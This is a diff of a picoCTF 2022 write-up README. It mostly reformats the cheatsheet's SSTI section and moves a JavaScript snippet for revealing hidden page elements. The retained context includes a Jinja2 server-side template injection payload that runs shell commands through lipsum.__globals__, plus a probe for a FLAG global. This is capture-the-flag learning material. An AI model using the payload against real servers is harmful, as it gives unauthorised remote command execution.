@@ -1,6 +1,6 @@
 # picoCTF 2022 writeups
 
-| [skip to cheatsheet](#CHEATSHEETS-D) | [rshdgvn's writeups](https://github.com/v1neSec/CTF-sheet) | 
+| [skip to cheatsheet](#) | [rshdgvn's writeups](https://github.com/v1neSec/CTF-sheet) | 
 
 every challenges i answered. with actual screenshots and recordings :D
 
@@ -207,7 +207,7 @@ dont need to explain that much, goodluck :>
 
 </details>
 
-# CHEATSHEETS :D
+# <br><br>CHEATSHEETS :D
 - [**Forensics**](#forensics)
   - [extracting texts from a file](#extracting-texts-from-a-file)
 - [**Cryptography**](#cryptography)
@@ -442,10 +442,11 @@ press `ctrl+shift+i` to inspect.
 for login, search, or anything that processes input.<br><br>
 **SSTI (server-side template injection)**
 
-submit this to see if it works with JINJA2 (Python):
-```bash
-{{ 7*7 }}
-```
+<img width="640" height="386" alt="template-decision-tree" src="https://github.com/user-attachments/assets/ce9d1d0e-f54d-4c9d-9c79-89d6d34a841a" />
+
+<br>
+<details><summary><h3>JINJA2 <code>{{ 7*7 }}</code>:</h3></summary>
+
 if it returns `49`, good job. u can now try submitting these to execute [Bash](https://www.w3schools.com/bash/bash_commands.php) commands:
 ```bash
 {{ lipsum.__globals__['os'].popen('PUT BASH COMMAND HERE').read() }}
@@ -471,6 +472,10 @@ for example:
 ```bash
 {{ url_for.__globals__['FLAG'] }}
 ```
+
+</details>
+<br>
+
 
 ---
 
@@ -509,6 +514,11 @@ mix and match some codes here like lego idk
 ### 1. modifying elements
 after u look at the html when u # [inspect](#inspect) the site.
 
+- **reveal every hidden elements:**
+```javascript
+document.querySelectorAll('[style*="none"]').forEach(e => e.style.display = 'block');
+document.querySelectorAll('[hidden]').forEach(e => e.removeAttribute('hidden'));
+```
 - **get an element by class (use `.`):**
 ```javascript
 document.querySelector('.element_name');
@@ -532,11 +542,6 @@ document.querySelector('.button1').click();
 - **submit a form directly:**
 ```javascript
 document.querySelector('.form1').submit();
-```
-- **reveal hidden elements (removes "display: none"):**
-```javascript
-document.querySelectorAll('[style*="none"]').forEach(e => e.style.display = 'block');
-document.querySelectorAll('[hidden]').forEach(e => e.removeAttribute('hidden'));
 ```
 
 ### 2. Fetch
